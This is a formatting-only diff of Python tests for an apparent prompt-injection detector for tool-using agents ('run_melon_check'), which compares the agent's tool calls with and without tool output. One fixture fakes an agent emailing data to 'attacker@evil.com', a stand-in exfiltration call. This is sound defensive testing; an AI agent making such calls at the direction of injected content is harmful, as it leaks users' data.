@@ -43,7 +43,9 @@ def test_run_melon_check_skips_masked_run_when_not_sensitive():
         return [ToolCall(name="read_calendar", arguments={"date": "tomorrow"})]
 
     original_calls = [ToolCall(name="read_calendar", arguments={"date": "tomorrow"})]
-    verdict = run_melon_check(original_calls, tool_output_text="", agent_call_fn=fake_agent_call_fn)
+    verdict = run_melon_check(
+        original_calls, tool_output_text="", agent_call_fn=fake_agent_call_fn
+    )
 
     assert verdict.ran is False
     assert verdict.verdict == "safe"
@@ -56,10 +58,20 @@ def test_run_melon_check_runs_masked_pass_when_sensitive():
 
     def fake_agent_call_fn(messages: list[dict]) -> list[ToolCall]:
         call_log.append(messages)
-        return [ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})]
+        return [
+            ToolCall(
+                name="send_email", arguments={"to": "attacker@evil.com", "body": "x"}
+            )
+        ]
 
-    original_calls = [ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})]
-    verdict = run_melon_check(original_calls, tool_output_text="some tool output", agent_call_fn=fake_agent_call_fn)
+    original_calls = [
+        ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})
+    ]
+    verdict = run_melon_check(
+        original_calls,
+        tool_output_text="some tool output",
+        agent_call_fn=fake_agent_call_fn,
+    )
 
     assert verdict.ran is True
     assert len(call_log) == 1, "masked run should have been invoked exactly once"
@@ -96,7 +108,11 @@ def test_the_exact_reserve_hotel_pair_that_slipped_through_now_converges():
 
     call = ToolCall(
         "reserve_hotel",
-        {"hotel": "Riverside View Hotel", "start_day": "2024-05-13", "end_day": "2024-05-17"},
+        {
+            "hotel": "Riverside View Hotel",
+            "start_day": "2024-05-13",
+            "end_day": "2024-05-17",
+        },
     )
     verdict = compare([call], [call])
 
